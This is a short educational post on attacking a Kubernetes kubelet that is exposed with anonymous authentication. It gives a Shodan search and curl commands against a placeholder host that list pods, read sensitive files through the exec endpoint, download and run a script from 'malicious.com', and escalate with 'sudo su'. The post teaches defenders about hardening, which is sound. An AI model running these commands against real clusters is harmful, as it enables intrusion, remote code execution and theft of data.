# Hacking Kubernetes Kubelet

⚠️ ATTENTION, THIS POST IS FOR EDUCATIONAL PURPOSES ONLY.  

Securing the components of our Kubernetes clusters must be a priority: Kubernetes is notorious for having default settings that are too permissive and hardening measures are often either neglected or focused solely on the API server.

Here's a real-world scenario of what could go wrong:

Our friendly neighborhood sysadmin, Joe, configured a cluster in a risky manner by exposing the kubelet to the internet with anonymous authentication enabled.

A malicious actor is conducting passive reconnaissance on Shodan using the following dork:
𝘬𝘶𝘣𝘦𝘭𝘦𝘵 𝘱𝘰𝘳𝘵:10250

The malicious hacker discovers Joe's cluster, with the kubelet service exposed on the hypothetical host "vulnerablehost" and port 10250.  
At this point, the attacker can attempt a discovery (according to the MITRE ATT&CK framework) with the following command:  

```console
𝘤𝘶𝘳𝘭 -𝘬 𝘩𝘵𝘵𝘱𝘴://𝘷𝘶𝘭𝘯𝘦𝘳𝘢𝘣𝘭𝘦𝘩𝘰𝘴𝘵:10250/𝘱𝘰𝘥𝘴 | 𝘫𝘲 .
```  


Since kubelet runs with the 𝐚𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬-𝐚𝐮𝐭𝐡 flag set to true (default), the attacker will obtain a list of all the pods running on the cluster.  
From now on, if debug endpoints are enabled, the hacker can proceed with malicious actions such as  

Exfiltrate Data:  
```console
𝘤𝘶𝘳𝘭 -𝘬 𝘩𝘵𝘵𝘱𝘴://𝘷𝘶𝘭𝘯𝘦𝘳𝘢𝘣𝘭𝘦𝘩𝘰𝘴𝘵:10250/𝘦𝘹𝘦𝘤/<𝘱𝘰𝘥_𝘯𝘢𝘮𝘦𝘴𝘱𝘢𝘤𝘦>/<𝘱𝘰𝘥_𝘯𝘢𝘮𝘦>/<𝘤𝘰𝘯𝘵𝘢𝘪𝘯𝘦𝘳_𝘯𝘢𝘮𝘦> -𝘟𝘗𝘖𝘚𝘛 -𝘥 '𝘤𝘮𝘥=𝘤𝘢𝘵 /𝘱𝘢𝘵𝘩/𝘵𝘰/𝘴𝘦𝘯𝘴𝘪𝘵𝘪𝘷𝘦/𝘧𝘪𝘭𝘦'
```  


Remote Code Execution:  
```console
𝘤𝘶𝘳𝘭 -𝘬 𝘩𝘵𝘵𝘱𝘴://𝘷𝘶𝘭𝘯𝘦𝘳𝘢𝘣𝘭𝘦𝘩𝘰𝘴𝘵:10250/𝘦𝘹𝘦𝘤/<𝘱𝘰𝘥_𝘯𝘢𝘮𝘦𝘴𝘱𝘢𝘤𝘦>/<𝘱𝘰𝘥_𝘯𝘢𝘮𝘦>/<𝘤𝘰𝘯𝘵𝘢𝘪𝘯𝘦𝘳_𝘯𝘢𝘮𝘦> -𝘟𝘗𝘖𝘚𝘛 -𝘥 '𝘤𝘮𝘥=𝘣𝘢𝘴𝘩 -𝘤 "𝘸𝘨𝘦𝘵 𝘩𝘵𝘵𝘱://𝘮𝘢𝘭𝘪𝘤𝘪𝘰𝘶𝘴.𝘤𝘰𝘮/𝘮𝘢𝘭𝘸𝘢𝘳𝘦.𝘴𝘩 -𝘖 /𝘵𝘮𝘱/𝘮𝘢𝘭𝘸𝘢𝘳𝘦.𝘴𝘩 && 𝘤𝘩𝘮𝘰𝘥 +𝘹 /𝘵𝘮𝘱/𝘮𝘢𝘭𝘸𝘢𝘳𝘦.𝘴𝘩 && /𝘵𝘮𝘱/𝘮𝘢𝘭𝘸𝘢𝘳𝘦.𝘴𝘩"'  

Privilege Escalation:  
```console
𝘤𝘶𝘳𝘭 -𝘬 𝘩𝘵𝘵𝘱𝘴://𝘷𝘶𝘭𝘯𝘦𝘳𝘢𝘣𝘭𝘦𝘩𝘰𝘴𝘵:10250/𝘦𝘹𝘦𝘤/<𝘱𝘰𝘥_𝘯𝘢𝘮𝘦𝘴𝘱𝘢𝘤𝘦>/<𝘱𝘰𝘥_𝘯𝘢𝘮𝘦>/<𝘤𝘰𝘯𝘵𝘢𝘪𝘯𝘦𝘳_𝘯𝘢𝘮𝘦> -𝘟𝘗𝘖𝘚𝘛 -𝘥 '𝘤𝘮𝘥=𝘣𝘢𝘴𝘩 -𝘤 "𝘴𝘶𝘥𝘰 𝘴𝘶"'  
```  

At this point, I assure you that you wouldn't want to be in poor Joe's shoes.  


- [Back to main page](../../../README.md)  
